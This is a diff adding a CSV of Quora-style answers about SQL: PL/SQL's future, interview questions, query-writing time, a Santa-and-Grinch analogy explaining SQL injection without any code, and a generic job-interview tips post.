@@ -1,0 +1,889 @@
+,answer,author,question,topic
+0,"I’ll offer just a few other thoughts.
+As long as Oracle Database is around, PL/SQL will be alive, thriving and critical. Does anyone think Oracle Database is going away in the next few decades? :-)
+As a database programming language, PL/SQL is generally not visible to UI developers, who mostly live in JavaScript these days. So it doesn’t get lots of “love” these days, but it’s still a powerful, incredibly useful language.
+I know this is going to sound funny, but PL/SQL is like toilet paper. You (say, the JavaScript developer) can live without it. But if you are building applications on top of Oracle Database, it’ll sure make your life a lot easier. And more comfortable.
+It is best to think of PL/SQL as a Data API language. Its most important role is to provide package-based APIs to SQL DML operations on tables.
+If you want to build very secure, easy-to-maintain, high performing applications on top of Oracle Database, you must use PL/SQL.
+28.1k Views · View 133 Upvoters · View Sharers",Steven Feuerstein,Is PL/SQL dead?,SQL
+1,"-----Tips and answer samples for #What is your favorite SQL interview question
+Hi friends, here are top 20 interview questions and answers and top 12 job interview tips, I hope it helps
+PART I: TOP 10 COMMON INTERVIEW QUESTIONS AND ANSWERS:
+1. Tell me about yourself?
+ 
+ This is one of the first questions you are likely to be asked. Be prepared to talk about yourself, and why you're an excellent fit for the job. Try to answer questions about yourself without giving out too much, or too little, personal information. You can start by sharing some of your personal interests and experiences that don't relate directly to work, such as a favorite hobby or a brief account of where you grew up, your education, and what motivates you. You can even share some fun facts and showcase your personality to make the interview a little more interesting.
+ 
+ If it feels daunting to generate this information from scratch, you can rely on a simple formula to construct your answer. The ‘present-past-future’ formula is a way to share key background points while ending on a high note. Begin with a brief overview of where you are now (which could include your current job along with a reference to a personal hobby or passion), reference how you got to where you are (here you could mention education, or an important experience such as a past job, internship or volunteer experience) and then finish by touching on a goal for the future.
+ 
+ Bonus points if you’re able to identify how the position you’re applying for aligns with how you envision your future.
+ 
+ Remember to be careful about what you include in your answer – avoid potentially contentious subjects such as political or religious leanings, unless you are absolutely positive that your opinions would be well-received by your interviewer. You should also avoid talking too much about family responsibilities or hobbies that might make your interviewer wonder whether you could commit yourself 100% to the job.
+ 
+ No matter how you choose to respond, write out your answer in advance and then read it aloud to ensure it sounds natural. Try to keep it short and sweet, as you don’t want to come across as the type of person who endlessly drones on about themselves.
+Related post: top 5 answer samples to this question: jobinterview68.blogspot. com/2018/07/tell-me-about-yourself-answer-samples.html
+2. What are your greatest professional strengths?
+ 
+ When answering this question, interview coach Pamela Skillings recommends being accurate (share your true strengths, not those you think the interviewer wants to hear); relevant (choose your strengths that are most targeted to this particular position); and specific (for example, instead of “people skills,” choose “persuasive communication” or “relationship building”). Then, follow up with an example of how you've demonstrated these traits in a professional setting
+ 
+ Tips to answer this question:
+ 
+ + Grab hold of the opportunity this question gives you. This question really lets you guide the interview where you want it to go. This your chance to relate your most impressive success story, so take advantage!
+ + Highlight a strength that is crucial to the position. (As I mentioned earlier)
+ + Find out from your company research and from the job description what strengths the company puts a lot of stock into.
+ + Don’t make claims that you can’t illustrate with a brief example or fact.
+ + Don’t be overly modest but don’t claim to be Superman or Superwoman either.
+ + Don’t name a strength that is irrelevant to the job at hand.
+ Here are top strengths for your job interview
+Related post: careerhandbook365.blogspot. com/2018/07/top-10-strengths-every-employers-are-looking-for.html
+ 
+ 3. What are your weaknesses?
+ 
+ ""What are your weaknesses"" is one of the most popular questions interviewers ask. It is also the most dreaded question of all. Handle it by minimizing your weakness and emphasizing your strengths. Stay away from personal qualities and concentrate on professional traits: ""I am always working on improving my communication skills to be a more effective presenter. I recently joined Toastmasters, which I find very helpful.""
+ 
+ Tips to answer this question:
+ 
+ + Show that you are aware of your weakness and what you have done to overcome it.
+ + Show that you are “self-aware” and that you have the ability to take steps to improve yourself.
+ + Don’t you DARE answer with the cliche “I’m a perfectionist” answer or any other such answer that the hiring manager can see right through.
+ + Don’t highlight a weakness that is a core competency of the job. (Know the job description “inside and out”.)
+ + Don’t dodge this question.
+ 
+ 4. Why did you leave (or why are you leaving) your job?
+ 
+ If an interviewer asks, ""Why did you leave (or why are you leaving) your job?"" and you're unemployed, state your reason for leaving in a positive context: ""I managed to survive two rounds of corporate downsizing, but the third round was a 20% reduction in the workforce, which included me.""
+ 
+ If you are employed, focus on what you want in your next job: ""After two years, I made the decision to look for a company that is team-focused, where I can add my experience.""
+ 
+ Tips to answer this question:
+ 
+ + If it was because you left voluntarily then reference a specific characteristic that the company you are interviewing for has that you are attracted to. One that your previous employer didn’t have.
+ + If you were let go, be honest and explain the situation and own it. Explain what you learned from the experience, because the interviewer knows you’re human, you make mistakes, and just wants to see that you were able to do something about it
+ + Words like “downsizing” and “budget cuts” and “bad economy” are good defenses if they are true and are the reasons for departure from the job.
+ + Don’t bash your last company or boss or anything along those lines.
+ + Don’t say, “It’s time for a career switch and I’d like to try my hand at the job you are offering” or “I’m tired of doing the same old thing.” Give a pointed, Positive reason for why you want to head off in a new direction.
+ + Don’t lie if you were fired.
+ 
+ 5. What is your greatest professional achievement?
+ 
+ Nothing says “hire me” better than a track record of achieving amazing results in past jobs, so don't be shy when answering this interview question! A great way to do so is by using the S-T-A-R method: Set up the situation and the task that you were required to complete to provide the interviewer with background context (e.g., “In my last job as a junior analyst, it was my role to manage the invoicing process”), but spend the bulk of your time describing what you actually did (the action) and what you achieved (the result). For example, “In one month, I streamlined the process, which saved my group 10 man-hours each month and reduced errors on invoices by 25%.”
+ 
+ Tips to answer this question:
+ 
+ + Talk about an accomplishment that exhibits how you will be a perfect fit for the company and for the position you’re interviewing for.
+ + Try and show some genuine passion when you’re talking about your accomplishment.
+ + Don’t fall into the trap of thinking your accomplishment is “too small”. The fact is, relating a small accomplishment that is inline with “what the company values” can be more powerful than an unrelated accomplishment. (Remember: “It’s not about you, It’s about them.”)
+ 
+ 6. Where do you see yourself in five years?
+ 
+ If asked this question, be honest and specific about your future goals, but consider this: A hiring manager wants to know a) if you've set realistic expectations for your career, b) if you have ambition (a.k.a., this interview isn't the first time you're considering the question), and c) if the position aligns with your goals and growth. Your best bet is to think realistically about where this position could take you and answer along those lines. And if the position isn’t necessarily a one-way ticket to your aspirations? It’s OK to say that you’re not quite sure what the future holds, but that you see this experience playing an important role in helping you make that decision.
+ 
+ Tips to answer this question:
+ 
+ + Demonstrate when you answer the question your level of commitment to the position they are interviewing you for.
+ + After you have demonstrated your commitment to the role you are interviewing for, outline a realistic growth strategy that is directly tied to the role you’re in and the needs and values of the company.
+ + Stress your interest in a long-term career at the company.
+ + Don’t exhibit ambition to the point of seeming like this particular job is just a “brief stepping stone” for you. You need to show commitment.
+ + Don’t say you want to be CEO of the company in 5 years.
+ + Don’t say “Actually I want to be in YOUR seat within the next 5 years.” to the hiring manager.
+Related post: top 5 answer samples to this question: jobsearchtips360.blogspot. com/2018/07/where-do-you-see-yourself-in-5-years.html
+7. Why should we hire you?
+ 
+ Answer ""Why should we hire you?"" by summarizing your experiences: ""With five years' experience working in the financial industry and my proven record of saving the company money, I could make a big difference in your company. I'm confident I would be a great addition to your team.""
+ 
+ Tips to answer this question:
+ 
+ + Show the hiring manager that you are uniquely suited to filling this position. Be the candidate that solves their “problems“.
+ + Show you know some significant details about the company and their general practices because you have researched the firm and are prepared.
+ + Tell a “success story” that highlights how you have the ‘qualities’ needed to fill their specific needs.
+ + Don’t get discouraged if the hiring manager mentions that “they have lots of very well qualified candidates…” before they lead into this question. (It’s a common “lead in”)
+ + Don’t be too modest. This is your chance to shine. Make it count.
+ + On the flip side don’t go too overboard and sound too arrogant.
+ + Don’t be “wishy-washy” or too general with your answer.
+ + Don’t answer with “why” you want the job. Answer with “why you are the perfect fit” for the job.
+ 
+ 8. What do you know about the company?
+ 
+ Any candidate can read and regurgitate the company’s “About” page. So, when interviewers ask this, they aren't necessarily trying to gauge whether you understand the mission—they want to know whether you care about it. Start with one line that shows you understand the company's goals, using a couple key words and phrases from the website, but then go on to make it personal. Say, “I’m personally drawn to this mission because…” or “I really believe in this approach because…” and share a personal example or two.
+ 
+ 9. What are your salary requirements?
+ 
+ The #1 rule of answering this question is doing your research on what you should be paid by using sites like Payscale and Glassdoor. You’ll likely come up with a range, and we recommend stating the highest number in that range that applies, based on your experience, education, and skills. Then, make sure the hiring manager knows that you're flexible. You're communicating that you know your skills are valuable, but that you want the job and are willing to negotiate.
+ 
+ 10. Have you got any questions?
+ 
+ At the end of the interview, it is likely that you will be given the chance to put your own questions to the interviewer.
+ 
+ + Keep them brief: there may be other interviewees waiting.
+ + Ask about the work itself, training and career development: not about holidays, pensions, and season ticket loans!
+ + Prepare some questions in advance: it is OK to write these down and to refer to your notes to remind yourself of what you wanted to ask.
+ 
+ It often happens that, during the interview, all the points that you had noted down to ask about will be covered before you get to this stage. In this situation, you can respond as follows:
+ Interviewer: Well, that seems to have covered everything: is there anything you would like to ask me?
+ Interviewee: Thank you: I'd made a note to ask about your appraisal system and the study arrangements for professional exams, but we went over those earlier and I really feel you've covered everything that I need to know at this moment.
+ 
+ You can also use this opportunity to tell the interviewer anything about yourself that they have not raised during the interview but which you feel is important to your application:
+ Don't feel you have to wait until this point to ask questions - if the chance to ask a question seems to arise naturally in the course of the interview, take it! Remember that a traditional interview is a conversation - with a purpose.
+ 
+ Ref:
++ Finance.yahoo. com/news/5-tough-interview-questions-answer-110059533.html
++ jobinterview247. com/free-ebook-195-interview-questions-and-answers
++ interviewtips365. info/free-ebook-42-secrets-to-win-every-job-interviews
++ 15 tips for nailing a phone or skype interview: businessinsider. com/15-tips-for-phone-or-skype-interviews-2014-2
+PART II: TOP 10 COMPETENCY BASED INTERVIEW QUESTIONS AND ANSWERS
+Competency-based interview questions require interviewees to give specific examples of times in which they demonstrated particular skills or attitudes. Generally, these questions require interviewees to describe a problem or situation, the actions they took to handle the problem, and the results of the situation. Such questions allow the employer to quickly evaluate an interviewee’s mindset, and to gauge how the interviewee handles certain situations.
+ 
+ 1. Teamwork interview questions:
+ 
+ Now onto the more generic skills, such as your ability to work in a team. No matter how big or small the team is, the hiring manager will want to know that you can develop a strong working relationship with them, as this is essential for productivity and achieving company goals. You may be asked something like the below in order to test if you are a strong team player:
+ 
+ Question: Give an example of team leading in past employment
+ 
+ Answer: You should summarise the task and nature of the group but focus primarily upon your role as team leader. List the personal qualities you possess which made you ideal for leading this team and how you achieved success. Conclude your answer by giving examples of the lessons you learnt while leading this team.
+ 
+ 2. Communications skills interview questions:
+ 
+ Your ability to communicate effectively and influence others to act in support of your own and team goals will be examined. An ability to adapt your communication methods depending on situations and individuals is important here.
+ 
+ Question: Provide an example of how you explained a technical concept to a client or co-worker lacking your technical expertise.
+ 
+ How to Answer: Competency based interview questions are meant to determine how well you communicate with others, including your ability to simplify difficult concept. The customer service question about negative feedback is meant to determine whether or not you’re capable of dealing with customer comments that aren’t all that positive in a courteous, constructive manner. With a few of your examples, briefly discuss what you learned from those interactions.
+ 
+ 3. Decision making interview questions:
+ 
+ Decision making is a skill that requires the ability to process information and filter this information to ensure you produce a sound and valid decision. You should be able to provide examples of situations where this skill has been tested. Use examples where an obvious answer is not immediately apparent.
+ 
+ Question: Can you tell me about a time when you consulted others when making important project decisions?
+ 
+ How to Answer: You’ll notice that interviewers tend to want specific examples to illustrate your abilities. It’s not unusual for questions to be fairly complex in nature, often involving multiple, related parts. Don’t get overwhelmed. Instead, answer questions one point at at time by providing relevant, easy to digest examples. If you forget the rest of the question, politely ask the interviewer to repeat it.
+ 
+ 4. Drive for results interview questions:
+ 
+ This competency assesses your personal motivation and how you approach challenges.
+ 
+ Question: What is your biggest achievement?
+ 
+ Answer: Ideally, use a work-related example to illustrate your key career achievement. Highlight exactly why you consider it important, with details of the role you played. If your biggest achievement in life is related to your personal life, use commercial references such as budget slashing, determination, commitment and team work to communicate all the associated positive aspects.
+ 
+ 5. Planning and organizing interview question:
+ 
+ Question: Give me an example of a time when you had to plan a project or a large piece of work.
+ 
+ Tips for Successful Answers:
+ 
+ + Demonstrate how you have worked in a structured and methodical way.
+ + Show real detail about the steps you have taken to plan.
+ + Explain how you have amended or flexed the original plans you’d made.
+ + Talk about how you built pre-emptive solutions to potential problems
+ 
+ 6. Customer focus interview question:
+ 
+ Your ability to understand and believe in the importance of customer focus will be tested here. You must display a competency for understanding the difference between internal and external customers.
+ 
+ Question: What about important clients, or complex or sensitive customer relationships?
+ 
+ Answer: If you can show that through your customer service orientation you saved the company from losing something of value (a big client, $X amount of revenue, 20 man hours a week) then you will really demonstrate your customer focus. Or did you save the company a political, organizational, or image problem? Write it out. What was the situation? What action did you take? How did you communicate to your teammates and how did you communicate with the customer? What was the result? … I hope this gets you thinking.
+ 
+ 7. Leadership interview questions:
+ 
+ Leadership is a competency employers look for in candidates who are applying for jobs that require them to lead, motivate and/or develop other people, usually team leader and management positions
+ 
+ Question: Describe a time you took a leadership position when you did not have the title of a leader.
+ 
+ Answer: In this question, take an example from a situation where you were in a group and took responsibility to delegate to achieve goals. Show how you gained from the other members to follow your lead and the result of your leadership.
+ 
+ For instance, in college, we were put into groups of four to complete a marketing project. We had to prepare a 15-page paper and 10-minute presentation on a new product. We want to introduce that outside the U.S. I took the initiative among the group to lead a discussion on how we should split up the work when we meet throughout the semester and deadlines for each person’s part of the work. Because I was the one to take the lead the discussion and had a plan in mind, I gained the buy in of the other members quickly. I took everyone’s e-mail address and created a group email to help us all keep track of our progress and so we could help each other outside of class and our meetings. By the end of the semester, my group achieved a 95% on our project.
+ 
+ 7. Conflict resolution skill interview questions:
+ 
+ Conflict resolution skills and the ability to disagree with others professionally and politely are necessary for successful contribution in organizations. If every employee employer hire is willing to engage in conflict resolution, more new ideas and better approaches to solving problems will take place in your organization.
+ 
+ Question: Give an example of a time you handled conflict in the workplace
+ 
+ Answer: Your interviewer will assess your adaptability and gauge the constructiveness of your approach towards conflict, tension and differences of opinion. Your example(s) should highlight the importance of your role in resolving these issues.
+ 
+ 8. Creative skills interview questions:
+ 
+ Question: Give me an example of your creativity?
+ 
+ Answer sample:
+ 
+ One of my key creative accomplishments occurred in my current job, when I had to increase market share for a new product without increasing our existing marketing budget. I kicked off with some internal brainstorming on how to maximize the use of our resources and be more creative in the way we market. I worked with our two interns, both of whom were creative writing majors, on creating a blog for our website, plus Instagram, Twitter, and Facebook pages for the company’s new product. I tasked the interns with managing the pages, and the three of us came up with relevant content for each social page. The ultimate aim was to create a community of fans and buzz around the new product.
+ 
+ Through product teasers on Twitter, the timely answering of questions on Facebook, and brief video tutorials on Instagram, we grew a fan base of 2,500 people in just three months. When the product was released, first day sales exceeded all expectations, and sales continued on a steady incline for the rest of the year. A lot of the success was attributed to the online fan base we developed, where positive word-of-mouth spurred an influx of customers to purchase the product through the trackable online sales page we created in-house with our design and dev teams.
+ 
+ 9. Time management interview questions:
+ 
+ Question: Explain a time when you were not able to meet a deadline?
+ 
+ Answer: Use an example were you where not able to meet a deadline due to outside factors. For instance, there was a big project that my team was working on, and I had split up the work among some members and myself. During that time, one member of the team had to leave due to their spouse getting a position in another city. He left at a critical time, and I had to re-assign his duties to someone else. I make the new person work to speed with the progression of the project and due to this, was not able to complete it on time. We were still able to complete the project a few days after the deadline even with the change in the team member.
+ 
+ 10. Problem solving interview questions:
+ 
+ The old adage goes that managers want people who come to them with solutions, not problems, and for me, I couldn’t agree more. The employees who can rise to a challenge and think of innovative ways to solve a problem are the ones who go on to achieve great things both for themselves and the business. Taking this into account, your manager may ask something like:
+ 
+ Question: Give an example of a challenge you faced in the workplace, and how you overcame it
+ 
+ Answer: If you are entering the workplace direct from school, college or university, this question will be geared towards your academic experiences.
+ 
+ Provide a great example of a task that involved using as many skills and abilities as possible. An ideal answer to this question enables you to demonstrate your ability to work in a team, display leadership skills and handle pressure.
+PART III: TOP JOB INTERVIEW TIPS
+1. Research the industry and company.
+ 
+ An interviewer may ask how you perceive his company's position in its industry, who the firm's competitors are, what its competitive advantages are, and how it should best go forward. For this reason, avoid trying to thoroughly research a dozen different industries. Focus your job search on just a few industries instead.
+ 
+ 2. Clarify your ""selling points"" and the reasons you want the job.
+ 
+ Prepare to go into every interview with three to five key selling points in mind, such as what makes you the best candidate for the position. Have an example of each selling point prepared (""I have good communication skills. For example, I persuaded an entire group to ...""). And be prepared to tell the interviewer why you want that job – including what interests you about it, what rewards it offers that you find valuable, and what abilities it requires that you possess. If an interviewer doesn't think you're really, really interested in the job, he or she won't give you an offer – no matter how good you are!
+ 
+ 3. Dress for Success
+ 
+ Plan out a wardrobe that fits the organization and its culture, striving for the most professional appearance you can accomplish. Remember that it’s always better to be overdressed than under and to wear clothing that fits and is clean and pressed. Keep accessories and jewelry to a minimum. Try not to smoke or eat right before the interview and if possible, brush your teeth or use mouthwash.
+ 
+ 4. Arrive on time, relaxed and prepared for the interview
+ 
+ There is no excuse ever for arriving late to an interview. Short of a disaster, strive to arrive about 15 minutes before your scheduled interview to complete additional paperwork and allow yourself time to get settled. Arriving a bit early is also a chance to observe the dynamics of the workplace.
+ The day before the interview, pack up extra copies of your resume or CV and reference list. If you have a portfolio or samples of your work, bring those along too. Finally, remember to pack several pens and a pad of paper to jot notes. Finally, as you get to the offices, shut off your cell phone. (And if you were chewing gum, get rid of it.)
+ 
+ 5. Make good first impressions
+ 
+ A cardinal rule of interviewing is to be polite and offer warm greetings to everyone you meet from the parking attendant to the receptionist to the hiring manager. Employers often are curious how job applicants treat staff members and your job offer could easily be derailed if you’re rude or arrogant to any of the staff. When it’s time for the interview, keep in mind that first impressions the impression interviewers get in the first few seconds of meeting you can make or break an interview.
+ Remember that having a positive attitude and expressing enthusiasm for the job and employer are vital in the initial stages of the interview; studies show that hiring managers make critical decisions about job applicants in the first 20 minutes of the interview.
+6. Secret weapon: tell your career stories at your job interview
+ 
+ You’re prepped and ready to totally nail this job interview. You’ve rehearsed your elevator pitch—in front of the mirror, even. You’ve committed the entire job description to memory. Heck, you even drove a practice route to the interview location to make sure you knew exactly where to park.
+ 
+ So, when the meeting finally rolls around, you’re feeling cool, calm, and collected. That is, until the interviewer jumps right in with the dreaded, “Tell me about a time when…”
+ 
+ Suddenly your mouth is dry, your mind is blank, and you have a mental facepalm moment. Why, oh why, didn’t you think to prepare for these types of prompts?
+ 
+ Yes, those requests for real-world examples—also known as behavioral interview questions—are frustrating. But, they’re also an extremely common part of the interview process.
+ 
+ Your best bet is to have a few stories prepared and ready to go for your next interview. Here are the six big ones you should make sure to have in your arsenal. They’re general enough that they can be used for a variety of questions, but specific enough that the person asking will feel like he or she’s getting a good, solid, detail-filled response.
+ 
+ 7. Prepare for common interview questions.
+ 
+ Every ""how to interview"" book has a list of a hundred or more ""common interview questions."" (You might wonder just how long those interviews are if there are that many common questions!) So how do you prepare? Pick any list and think about which questions you're most likely to encounter, given your age and status (about to graduate, looking for a summer internship). Then prepare your answers so you won't have to fumble for them during the actual interview.
+ 
+ 8. Line up your questions for the interviewer.
+ 
+ Come to the interview with some intelligent questions for the interviewer that demonstrate your knowledge of the company as well as your serious intent. Interviewers always ask if you have any questions, and no matter what, you should have one or two ready. If you say, ""No, not really,"" he or she may conclude that you're not all that interested in the job or the company. A good all-purpose question is, ""If you could design the ideal candidate for this position from the ground up, what would he or she be like?""
+ 
+ If you're having a series of interviews with the same company, you can use some of your prepared questions with each person you meet (for example, ""What do you think is the best thing about working here?"" and ""What kind of person would you most like to see fill this position?"") Then, try to think of one or two others during each interview itself.
+ 
+ 9. Practice, practice, practice.
+ 
+ It's one thing to come prepared with a mental answer to a question like, ""Why should we hire you?"" It's another challenge entirely to say it out loud in a confident and convincing way. The first time you try it, you'll sound garbled and confused, no matter how clear your thoughts are in your own mind! Do it another 10 times, and you'll sound a lot smoother and more articulate.
+ 
+ But you shouldn't do your practicing when you're ""on stage"" with a recruiter; rehearse before you go to the interview. The best way to rehearse? Get two friends and practice interviewing each other in a ""round robin"": one person acts as the observer and the ""interviewee"" gets feedback from both the observer and the ""interviewer."" Go for four or five rounds, switching roles as you go. Another idea (but definitely second-best) is to tape record your answer and then play it back to see where you need to improve. Whatever you do, make sure your practice consists of speaking aloud. Rehearsing your answer in your mind won't cut it.
+ 
+ 10. Make your selling points clear.
+ 
+ If a tree falls in the forest and no one is there to hear it, did it make a sound? More important, if you communicate your selling points during a job interview and the interviewer doesn't get it, did you score? On this question, the answer is clear: No! So don't bury your selling points in long-winded stories. Instead, tell the interviewer what your selling point is first, then give the example.
+ 
+ 11. Ask questions
+ 
+ You should always have some questions for your interviewer to demonstrate your interest in the position. Prepare a minimum of five questions, some which will give you more information about the job and some which delve deeper into the culture and goals of the company.
+ 
+ 12. Thank Interviewer(s) in Person, by Email, or Postal Mail
+ 
+ Common courtesy and politeness go far in interviewing; thus, the importance of thanking each person who interviews you should come as no surprise. Start the process while at the interview, thanking each person who interviewed you before you leave. Writing thank-you emails or notes shortly after the interview will not get you the job offer, but doing so will certainly give you an edge over any of the other finalists who didn’t bother to send thank-you notes.
+372 Views · View 5 Upvoters",Howard Ivan,What is your favorite SQL interview question?,SQL
+2,"Have you guys noticed that in America they already started playing Christmas music in stores? Although I think it’s a bit early to be celebrating the holiday season,  its timing makes it appropriate for my analogy that I’ll be using to explain to all the grandmas out there just how SQL injections work.
+
+Let me present to you the three main characters of my story:
+the programmer-  played by Santa Claus
+the program-  played by the head elf
+the cracker (correct term for hacker with ill intentions)- played by the Grinch
+
+The Grinch perfectly embodies the intentions of a cracker—he wants to destroy Christmas and plunder all the Christmas presents in the world. In this analogy, Christmas is your web app and all those precious Christmas presents are all of your web app’s valuable data—customers’ credit card numbers, PII, personal files, etc.
+
+For just this story’s sake, let’s believe that people come to Santa to collect their gifts instead of him coming to everyone’s house.
+Once upon a time, on Christmas Day, Santa prepared all the presents for the little girls and boys of the world. Now, he assigned the head elf the task of giving a gift to each once they told the elf their names. Santa told the elf, ""Get the present for (    ), and fill the blank with whatever the name is of the child you're serving.”
+
+The head elf did as he was told and children came and gave their names to the head elf individually and they each got their respective gifts. However, the Grinch came dressed as a child (because obviously no one would welcome the Grinch if they recognized him!) and he said, “My name is Everyone.” The elf wasn’t prepared for this situation because Santa said to just get the present for whatever the child identifies as. The elf is confused and overwhelmed—so in his state of vulnerability—the Grinch takes everyone’s gifts.
+
+This is an SQL injection. The program was trying to give the data set for a typical visitor, but the cracker was able to find a vulnerability in the programming and manipulate the program to give him access to all the data.
+
+But here is the clever thing—let’s say that when the Grinch is asked for his name by the elf, and instead of saying “everyone,” he says,” Grinch and burn all of the presents.” Now, the elf will not only get the gift for the Grinch (though I doubt he would have one), but he will also burn the rest of the gifts.
+
+So how do programmers protect against SQL injections? Well, they try to program escape special characters (meaning ignore characters that are not expected answers) in the web app. An example of this would be Santa telling the elf, “You should not destroy any gifts. Also, only gift one gift per person.” So when the Grinch comes and asks for everyone’s gifts or says “Grinch and burn all presents,” the elf will not make a mistake.
+
+It is difficult to find all the vulnerabilities in a program, which is why many large companies have dedicated programmers that work to find and remedy these vulnerabilities. Another option for companies to decrease these risks is to use sophisticated firewall systems that block the harmful traffic from your web app a.k.a Santa hiring strong body guards in front of the gift shop and they check the IDs of all the entries to make sure that no Grinches ever enter. 
+
+Large companies spend thousands of dollars to upkeep these firewall systems, but I find that small businesses can benefit from web app firewall (WAF) systems most of the time to prevent SQL injections. Of course it is definitely recommended to work on making sure that you program your web app to limit vulnerabilities, or soon, you will end up handing out a lot of presents to Grinches.
+55.1k Views · View 512 Upvoters",Christine Wasmuth,How can I explain SQL injection to my grandmother?,SQL
+3,"I’m not a data scientist but I have been working with SQL professionally for over 20 years. SQL is a deceptively simple language and therefore it’s easy for people to think once you’ve learned the basics of SQL that you’ve mastered it.
+The truth is far different from that. SQL is an immensely powerful language that is rich with complex functionality. I was reminded of that first hand when I came across a book by Itzik Ben-Gan a couple of years ago covering advanced sql concepts. I learned tips and tricks in this book I’ve never thought of before.
+I learned about advanced tricks using window functions. I learned about how you can use SQL to solve graph theory problems (i.e. solving for N people away from Kevin Bacon in the Kevin Bacon game). My mind was completely blown when I learned about recursive queries.
+The concept of writing recursive queries still blows my mind. I’ve never written one before and the application of a recursive query still eludes me. The example he uses to demonstrate recursive queries was for writing a SQL query that solves the shortest driving path along streets in a city (i.e. think what Google maps does on a daily basis). I could easily imagine a procedural language like Java or C++ doing that but a single SQL query? No freaking way.
+So SQL is definitely a powerful language that can take many decades to master completely.
+EDIT: The book I mentioned above is called T-SQL Querying . It’s written for SQL Server but the most of the concepts are covered by all RDBMS.
+4.7k Views · View 54 Upvoters · Answer requested by
+Michael Kheifetz",Brad Caffey,"After being a data scientist for years, what new things do you still learn about SQL?",SQL
+4,"SQL isn’t fast. SQL doesn’t have speed at all.
+If your SQL statement is returning very quickly, it’s because of one or all of these things.
+a) Your DB is fast.
+b) You dataset is small and simple.
+c) Your SQL is simple.
+Also, high level languages aren’t necessarily slow, Java is ‘high level’, but it goes like shit off a shovel.
+I’d also question why you think it’s fast? Fast is a relative term, what are you comparing it to?
+17.5k Views · View 128 Upvoters",Moray Taylor,"If SQL is a high-level language, why is it so fast?",SQL
+5,"I’ve seen some 300-line queries in a “business intelligence” context that probably took a day or two to write, and functional production code with 1000 line queries where people are trying to do non-trivial calculations and write them to a table. I want to say those are examples of things to avoid because it gets really unreadable and error prone when the SQL is that crazy.
+I think Håkon Hapnes Strand’s 5 minutes is a low estimate if you work in product analytics/business intelligence, because I found that very often I needed to do some weird joining with annoying subqueries and weird string functions. This is not to say this isn’t an indication that the logic should ideally be moved somewhere else if the SQL queries are getting bad.
+If you’re doing analytics, often times you’re stuck with doing all the logic in SQL if you’re using some specific software to present charts and tables. In other cases, when you need to aggregate a large amount of data and there isn’t a good way to batch operations, e.g. Amazon Redshift can be incredibly performant thanks to all kinds of magic under the hood, so you eat the extra time it takes to write a big SQL query.
+I’d say the worst queries I’ve written for making a dashboard or generating a report took maybe 3 hours with the database in an as-denormalized-as-practical state. With a much simpler schema, I’ve spent 45 minutes writing a query because I decided to do some weird calculations in SQL for performance.
+However I’d say these are very much exceptions. If you’re concerned about measuring your familiarity/proficiency with SQL, I’ll just say that when I interviewed at Facebook Data Science, several interviewers asked me to write some SQL on the whiteboard to solve some problem, and the worst one took me 15 minutes, which would’ve been only 5 if I were typing on a keyboard. Everything you see on HackerRank for example should take a few minutes max.
+3.1k Views · View 25 Upvoters",Andrew Qian,"As a data scientist, how long does it take you to think of and write the more complicated SQL queries at your job?",SQL
+6,"There is no toughest SQL query per se but if you are asking from an interview perspective, here are some of my personal favorite questions that I like to ask-
+In a table with 50,000 records that contains credit card numbers as xxxx-xxxx-xxxx, I have a requirement wherein I don't need the hyphen(-) and rather I need the entire card number together. How would you frame an SQL query to make the required change?
+In a self-join, what kind of condition goes into the where clause? -This question usually stumps a candidate who doesn't have conceptual clarity on self join.
+How do you perform metadata testing in DB?
+I have transferred all the 10,000 records from table 1 to table 2. There is a third table called table 3 that will contain those records which have not been transferred from table 1 to table 2. Write an SQL that would determine all the records have been pushed from table 1 to table 2. And write an SQL that would tell me which records have been rejected during the transfer from table 1 to table 2.
+I have table that has an employee ID column. I have a requirement wherein the client needs to separate the Odd-numbered IDs from the even-numbered IDS. How would you create an SQL statement for this requirement?
+I have a table with column ID that has 10 rows of data out of which two rows hold NULL value. What is the output in case of
+Select count(ID) from table;
+Select count(*) from table;
+Happy Learning!
+2.3k Views · View 3 Upvoters",Gaurav Bamezai,What is the toughest SQL query?,SQL
+7,"You might as well ask, “Why are we still using boolean algebra?”
+SQL has its roots in the concept of a Relation between sets, which in turn is based on really fundamental mathematics.
+SQL is an abstract declarative language that allows us to work with data as logical sets, regardless of how it is physically stored. If you like high-level languages, SQL is one.
+No other alternative database system has achieved what SQL has:
+Practical programming language that implements important set theory. Performs data operations that are mathematically closed. For example, a join of two relations is also a relation, which means you can perform other relational operations on that result.
+ANSI/ISO standard. Forms a lingua franca for applications written in every programming language to access data.
+Many advanced implementations are available to convert abstract data-manipulating code into direct database operations that are both efficient and durable. There are lots of resources available, and many trained software developers who know SQL.
+If you can point to another data management solution that is superior to SQL in the above points, I’d be glad to check it out.
+22.1k Views · View 166 Upvoters",Bill Karwin,Why are SQL based databases still being used today? Why are people still choosing SQL solutions to start their projects?,SQL
+8,"SQL/relational databases remains a very good option for large amounts of structured data, it’s really that simple.
+SQL is still being used in the way that Linux is still being used, it’s a perfectly good solution for many problems and systems.
+SQL isn’t deprecated, it’s not a legacy options, it’s a perfectly good option for new projects.
+SQL is also used in “NoSQL” databases, as much as that sounds weird. OrientDB for example is a “NoSQL” database with support for SQL.
+Relational databases are tried and tested, and work very well if you know how to use them, i.e. make your data “sane” and learn how indexes work. They’re also battle tested for large amounts of data. Say you’ve got a 100 million entries in a database, lots of people would consider that a large database, for an Oracle Database expert, it’s probably considered closer to “empty” than “big”.
+23.4k Views · View 74 Upvoters",Garry Taylor,Why are SQL based databases still being used today? Why are people still choosing SQL solutions to start their projects?,SQL
+9,"NO!
+I was at a software marketing event and ran into someone I’d not seen in about 8 years. He asked me what I was doing: “Systems Programmer for the xxxxx banks, responsible for all systems packages as well as doing some C-I-C-S transaction programming, and I designed and wrote the teller terminal system…”
+The guy cut me off and chuckled saying, “It’s ‘kicks’ don’t you know that? I though all systems programmers knew you don’t use the letters.”
+I told him that he was the exception, that all of the other systems programmers I knew - perhaps 20 - said C-I-C-S, ,not ‘kicks and that I had never heard even one IBM employee say kicks - it is always C-I-C-S.
+Stands for Customer Information Control System - it was one of IBM’s main online packages which allowed customers to write online processing programs. This was when batch processing was still the prominent use of a computer. I’m talking of circa 1979.
+Comparing experience and position requirements and responsibilities would show, at that time, that I had been doing systems work (CICS being one of the systems I was responsible) as well as CICS programming (applications) for twice as long has he had been doing systems work and I was then handling all systems work for a medium sized data processing shop - 370/148 and then upgraded to a 4341.
